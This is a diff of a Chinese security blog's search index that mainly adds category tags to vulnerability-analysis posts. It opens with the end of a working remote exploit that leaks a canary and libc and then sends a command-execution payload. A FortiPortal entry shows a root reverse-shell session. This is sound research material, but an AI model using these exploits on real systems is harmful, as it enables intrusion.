class="built_in">len</span>(byte4))</span><br><span class="line">    <span class="keyword">for</span> m_byte4 <span class="keyword">in</span> byte4:</span><br><span class="line">        global_locale = global_locale | (m_byte4 &lt;&lt; <span class="number">32</span>)</span><br><span class="line">        byte5 = _leak2(<span class="number">5</span>, global_locale)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte5) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] %d not right&quot;</span> % m_byte4)</span><br><span class="line">            global_locale &amp;= (<span class="number">0x00</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(byte5)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte5) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error leaking libc address. Try again.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(byte5) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Warning: more than 1 value detected. The result maybe unreliable.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    global_locale |= (byte5[<span class="number">0</span>] &lt;&lt; <span class="number">40</span>)</span><br><span class="line">    libc_addr = global_locale - nl_global_locale_offset</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Got libc: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    <span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ISHFTC</span>(<span class="params">n, d, N</span>):  </span><br><span class="line">    <span class="keyword">return</span> ((n &lt;&lt; d) % (<span class="number">1</span> &lt;&lt; N)) | (n &gt;&gt; (N - d))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Connecting to %s:%d ...&quot;</span> % (R_HOST, R_PORT))</span><br><span class="line">    s = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">         s.connect((R_HOST, R_PORT))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error connecting server&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Fetching server info ...&quot;</span>)</span><br><span class="line">    _get_srv_info_packet = DSI(<span class="number">0x0</span>, DSI_FPGetSrvrInfo, <span class="number">0x0101</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_get_srv_info_packet)</span><br><span class="line">    simple_parse_srvInfo(s.recv(MAX_RECV_LENGTH))</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    canary = leak_canary()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    libc_addr = leak_libc()</span><br><span class="line">    </span><br><span class="line">    s = connect_open_session()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Deploy payload (stage 1)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    enc_system_address = ISHFTC(libc_addr + <span class="number">0x0000000000453A0</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    enc_execl_addr = ISHFTC(<span class="number">0x000000000408DA0</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    enc_popen_addr = ISHFTC(libc_addr + <span class="number">0x00000000006F610</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line">    setcontext_addr = ISHFTC(libc_addr + <span class="number">0x000000000047B97</span>, <span class="number">0x11</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    fake_dtor_list = struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, setcontext_addr) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, username_address) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x0</span>) + \</span><br><span class="line">                     struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">    gold = fake_dtor_list + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, setcontext_addr) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x20</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0x656240</span>) + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x80</span> - <span class="number">0x20</span> - <span class="number">8</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x00000000006F5B6</span>) + command</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;\x12&quot;</span> + <span class="string">b&quot;\x06\x41\x46\x50\x33\x2e\x33&quot;</span> + <span class="string">b&quot;\x04\x44\x48\x58\x32&quot;</span> + struct.pack(<span class="string">&quot;&lt;B&quot;</span>, <span class="built_in">len</span>(gold) + <span class="number">0x10</span>) + username + gold + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _fplogin_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    s.send(_fplogin_packet)</span><br><span class="line">    s.recv(MAX_RECV_LENGTH)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Deploy payload (stage 2)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * nl_global_locale_padding_offset + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + nl_global_locale_offset) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x3c8a80</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xb</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x1767a0</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x176da0</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x1776a0</span>) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, username_address) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0x3c4b20</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">48</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xc7a700</span> + libc_addr) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, libc_addr + <span class="number">0xc79010</span>) + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, <span class="number">0xc7a700</span> + libc_addr) + <span class="string">b&quot;a&quot;</span> * <span class="number">16</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, canary) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">8</span></span><br><span class="line">    payload_len = <span class="built_in">len</span>(payload)</span><br><span class="line">    _test_packet = DSI(<span class="number">0x0</span>, DSI_Common, <span class="number">0x0</span>, payload_len, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet() + payload</span><br><span class="line">    s.send(_test_packet)</span><br><span class="line"></span><br><span class="line">    _close_packet = DSI(<span class="number">0x0</span>, DSI_CloseSession, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)._gen_packet()</span><br><span class="line">    s.send(_close_packet)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Exploit finish.&quot;</span>)</span><br></pre></td></tr></table></figure></div>
 
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2022-26318</title>
@@ -1992,6 +2040,9 @@
 <p>shellcode 中构造 syscall 将 python 代码写入本地文件并执行，解决了 &#x2F;tmp mount 为 noexec 的问题。</p>
 <p>很多完美的内存布局降低了开发利用代码的难度，加上作者巧妙的利用手段，使得此 exp 稳定性较高，危害较大。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Linux 命令注入备忘录</title>
@@ -2319,6 +2370,9 @@
 <p><a class="link"   href="https://blog.zeddyu.info/" >https://blog.zeddyu.info <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/" >https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>SonicOS 固件解密 (1)</title>
@@ -2534,6 +2588,9 @@
 <p><a class="link"   href="http://pavelhan.tech/post/2020-07-07-00-Linux%E7%9A%84%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AFLUKS/" >Linux的磁盘加密技术LUKS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>本文未收取稿费</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2019-17059</title>
@@ -2651,6 +2708,9 @@
                       alt="asciicast"
                 ></a></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>RT-AX56U information disclosure vulnerability</title>
@@ -2685,6 +2745,9 @@
                      
                 ></p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Tianfu Cup 2021 RT-AX56U RCE</title>
@@ -2813,6 +2876,9 @@
 <p>利用此漏洞需要一些特殊的内存布局，感兴趣的读者可自行尝试其它更稳定的利用手段。</p>
 <p>如文章有误敬请指正，欢迎来信讨论。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>CVE-2021-36260</title>
@@ -2868,6 +2934,9 @@
 
 <p>我们可以看到参数 a1 经过 hwif_is_all_language_character_legal 过滤之后会将其作为文件名检查目标文件是否存在，如果不存在则将 a1 拼接到 tar 命令中直接带入 system 函数执行，显然存在命令注入。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>MIPS ROP-system parameter issue</title>
@@ -2955,9 +3024,12 @@
 <p>[2] <a class="link"   href="https://s3-eu-west-1.amazonaws.com/downloads-mips/documents/MD00090-2B-MIPS32PRA-AFP-06.02.pdf" >MIPS® Architecture For Programmers  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>[3] <a class="link"   href="https://stackoverflow.com/questions/2618790/mips-gp-register" >MIPS $gp register - Stack Overflow <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
-    <title>CVE-2021-32588 FortiPortal pre auth RCE</title>
+    <title>CVE-2021-32588</title>
     <url>/2021/09/02/CVE-2021-32588/</url>
     <content><![CDATA[<p>披露信息：<a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-21-077" >https://www.fortiguard.com/psirt/FG-IR-21-077 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>漏洞编号：CVE-2021-32588</p>
@@ -3037,6 +3109,9 @@
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop nc -lnvp 13337                    </span><br><span class="line">Listening on 0.0.0.0 13337</span><br><span class="line">Connection received on 192.168.0.200 46194</span><br><span class="line">uname -a</span><br><span class="line">Linux FPCVM64 2.6.36.3 #1 SMP Wed May 19 10:33:07 PDT 2021 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>
 
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>固件模拟 Case Study (3)</title>
@@ -3142,6 +3217,9 @@
                 ></p>
 <p>至此固件模拟成功。</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>IoT 设备中身份验证绕过的一些漏洞(2)</title>
@@ -3210,15 +3288,21 @@
 <li>设备直接暴露了敏感接口，攻击者通过访问这些接口得到认证信息。</li>
 </ol>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>Moxa Nport 系列设备固件解包</title>
     <url>/2021/05/29/moxa-nport-unpack/</url>
-    <content><![CDATA[<p>Moxa Nport series firmware unpack.</p>
+    <content><![CDATA[<p>Moxa Nport 设备固件解包。</p>
 <span id="more"></span>
 
 <h2 id="固件格式"><a href="#固件格式" class="headerlink" title="固件格式"></a>固件格式</h2><p>前四个字节为 *FRM，用于识别固件。固件头部大小为 0x160，内部包括文件数量、代码段偏移量等数据结构，头部后面跟着的是文件表，每一个条目大小 0x40，包括文件名、文件偏移量、大小等信息。最后是代码段。</p>
 <h2 id="解包脚本"><a href="#解包脚本" class="headerlink" title="解包脚本"></a>解包脚本</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author: CataLpa</span></span><br><span class="line"><span class="comment"># Date: 2021-05-29</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filename, start_address, end_address, data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = <span class="built_in">open</span>(<span class="string">&quot;./unpacked/&quot;</span> + filename, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        i = start_address</span><br><span class="line">        temp_data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= end_address:</span><br><span class="line">            temp_data += data[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        t.write(temp_data)</span><br><span class="line">        t.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No unpacked folder.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> args.f:</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(args.f):</span><br><span class="line">            f = <span class="built_in">open</span>(args.f)</span><br><span class="line">            data = f.read()</span><br><span class="line">            f.close()</span><br><span class="line">            magic = data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">if</span> magic != <span class="string">&quot;*FRM&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Not a valid firmware file.&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">            header_length = <span class="number">0x160</span></span><br><span class="line">            code_offset = u32(data[<span class="number">0x54</span>:<span class="number">0x58</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Code offset: 0x%x&quot;</span> % code_offset)</span><br><span class="line">            table_length = u32(data[<span class="number">0xa2</span>:<span class="number">0xa4</span>].ljust(<span class="number">4</span>, <span class="string">&quot;\x00&quot;</span>))    <span class="comment"># Nport-5400</span></span><br><span class="line">            <span class="comment"># table_length = u32(data[0x9a:0x9c].ljust(4, &quot;\x00&quot;))  # Nport-5100</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] File: 0x%x&quot;</span> % table_length)</span><br><span class="line">            </span><br><span class="line">            i = header_length</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            filename = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; header_length + (table_length * <span class="number">0x40</span>):</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">                filename = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> j &lt; <span class="number">0x30</span>:</span><br><span class="line">                    <span class="keyword">if</span> data[j + i] != <span class="string">&#x27;\x00&#x27;</span>:</span><br><span class="line">                        filename += data[j + i]</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                j += <span class="number">8</span></span><br><span class="line">                length = u32(data[j + i] +  data[j + i + <span class="number">1</span>] + data[j + i + <span class="number">2</span>] + data[j + i + <span class="number">3</span>])</span><br><span class="line">                j += <span class="number">4</span></span><br><span class="line">                start_address = u32(data[j + i] +  data[j + i + <span class="number">1</span>] + data[j + i + <span class="number">2</span>] + data[j + i + <span class="number">3</span>])</span><br><span class="line">                i += <span class="number">0x40</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] Extracting &quot;</span> + filename + <span class="string">&quot; ...&quot;</span>)</span><br><span class="line">                extractFile(filename, start_address + <span class="number">0x60</span>, start_address + <span class="number">0x60</span> + length, data)</span><br><span class="line">            binary = <span class="built_in">open</span>(<span class="string">&quot;binary.bin&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">            binary.write(data[code_offset:])</span><br><span class="line">            binary.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] No such file.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Use -h to get help.&quot;</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>QEMU 网络配置一把梭</title>
@@ -3290,6 +3374,9 @@
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/u014022631/article/details/53411557" >https://blog.csdn.net/u014022631/article/details/53411557 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://shadow-file.blogspot.com/2013/05/running-debian-mips-linux-in-qemu.html" >https://shadow-file.blogspot.com/2013/05/running-debian-mips-linux-in-qemu.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>一些虚拟机获取 shell 的方法</title>
@@ -3418,129 +3505,9 @@
 <p><a class="link"   href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p><a class="link"   href="https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf" >Infiltrating Corporate Intranet Like NSA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>一些漏洞</title>
-    <url>/2021/03/16/vulns1/</url>
-    <content><![CDATA[<h2 id="CNVD-2017-03792"><a href="#CNVD-2017-03792" class="headerlink" title="CNVD-2017-03792"></a>CNVD-2017-03792</h2><p>披露信息：<a class="link"   href="https://www.cnvd.org.cn/flaw/show/CNVD-2017-03792" >https://www.cnvd.org.cn/flaw/show/CNVD-2017-03792 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>CNVD 编号：CNVD-2017-03792</p>
-<p>漏洞评分：6.8(AV:L&#x2F;AC:M&#x2F;Au:S&#x2F;C:N&#x2F;I:N&#x2F;A:C)</p>
-<p>漏洞描述：深信服EasyConnect PC客户端7.1.0.4版本由于二进制路径有空格(Program Files)并且整个路径没有用没有双引号括起来，存在exe劫持漏洞，允许攻击者利用漏洞可以以SYSTEM权限在受害者机器上执行任意代码。</p>
-<span id="more"></span>
-
-
-
-<p>easyconnect 7.1.0.4 版本软件下载地址：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1f1xX4ypV0zTtQ5Q_fnaGCQ </span><br><span class="line">提取码：3qsv </span><br></pre></td></tr></table></figure></div>
-
-<p>漏洞描述中提到攻击者可以利用这个漏洞实现提权，以 SYSTEM 权限执行任意代码，安装好软件之后通过任务管理器可以看到名为 SangforPromoteService.exe 的程序，它运行在 SYSTEM 权限下。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-1.png"
-                     
-                ></p>
-<p>首先打开终端，执行 tasklist 命令查看此进程的 PID：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-2.png"
-                     
-                ></p>
-<p>然后执行 netstat -ano 查看它是否监听了端口：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP    127.0.0.1:10000        0.0.0.0:0              LISTENING       4244</span><br><span class="line">UDP    127.0.0.1:40000        *:*                                    4244</span><br></pre></td></tr></table></figure></div>
-
-<p>这个进程监听 TCP 10000 以及 UDP 40000 两个端口，根据 C 语言中网络编程相关内容，我们可以在程序中通过 recv 以及 recvfrom 两个函数定位关键代码。</p>
-<h3 id="SangforPromoteService-exe-逻辑简述"><a href="#SangforPromoteService-exe-逻辑简述" class="headerlink" title="SangforPromoteService.exe 逻辑简述"></a>SangforPromoteService.exe 逻辑简述</h3><p>注：程序版本为 7.1.0.1，MD5：a82bff2f271c86b125def8a1138adde3</p>
-<p>关键函数：sub_413720</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_413720</span><span class="params">(SOCKET s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = recv(s, &amp;buf, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    v2 = v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( WSAGetLastError() != <span class="number">10035</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">    WSAGetLastError();</span><br><span class="line">    sub_401596(aServiceRecvFai, v2);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log</span>(&amp;dword_43BFE0, aRecvD, v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0x10</span> &amp;&amp; *&amp;v9[<span class="number">3</span>] == <span class="number">4</span> &amp;&amp; *&amp;v9[<span class="number">7</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">log</span>(&amp;dword_43BFE0, aReReg, v6);</span><br><span class="line">    sub_401596(aServiceDeldnsR, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401695(&amp;buf, &amp;v12, &amp;len);</span><br><span class="line">    v3 = send(s, &amp;v12, len, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( len != v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = WSAGetLastError();</span><br><span class="line">      sub_401596(aSendErrorD, v4);</span><br><span class="line">    &#125;</span><br><span class="line">    Sleep(<span class="number">0x64</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>第 5 行调用 recv 函数接收从 10000 端口发送过来的数据，保存到 buf 中。第 21 行对接收到的数据中某些字节判断，如果不满足就执行函数 sub_401695。</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_40FBC0</span><span class="params">(<span class="type">void</span> *this, <span class="type">int</span> ArgList, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ArgList &amp;&amp; a2 &amp;&amp; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(ArgList + <span class="number">4</span>);</span><br><span class="line">    v5 = ArgList + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        result = sub_401230(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        result = sub_401005(v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        result = sub_4011D6(this);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        result = sub_40152D(v5, a2, a3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *a2 = <span class="number">16</span>;</span><br><span class="line">      *(a2 + <span class="number">4</span>) = v4 + <span class="number">1</span>;</span><br><span class="line">      *(a2 + <span class="number">8</span>) = <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        *(a2 + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">        *a3 = <span class="number">16</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(a2 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">        *a3 = <span class="number">16</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401596(aServiceAnalyse, ArgList);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>第 11 行存在 switch 结构，v4 是从用户输入的数据中提取得到，根据不同的值执行 4 个不同的功能函数。</p>
-<ol>
-<li>UpdateSuperService：更新文件 SangforPromote.exe</li>
-<li>StartSuperExe：执行文件 SangforPromote.exe</li>
-<li>StopSuperExe：停止 SangforPromote.exe 进程</li>
-<li>IsServiceOK：查询 SangforPromote.exe 进程是否正常</li>
-</ol>
-<p>其中 StartSuperExe 函数代码如下</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(&amp;Src, <span class="string">&quot;%ProgramFiles%\Sangfor\SSL\Promote&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(&amp;Src, <span class="string">&quot;\SangforPromote.exe&quot;</span>);  </span><br><span class="line"><span class="keyword">if</span> ( !ExpandEnvironmentStringsA(&amp;Src, &amp;Dst, <span class="number">0x104</span>u) )</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;Dst, aCProgramFilesS);</span><br><span class="line">  <span class="comment">//.... </span></span><br><span class="line">  <span class="comment">//....</span></span><br><span class="line">  <span class="keyword">if</span> ( !CreateProcessAsUserA(phNewToken, <span class="number">0</span>, &amp;Dst, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x20</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = GetLastError();</span><br><span class="line">    sub_401596(aCreateprocessa, v9);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span 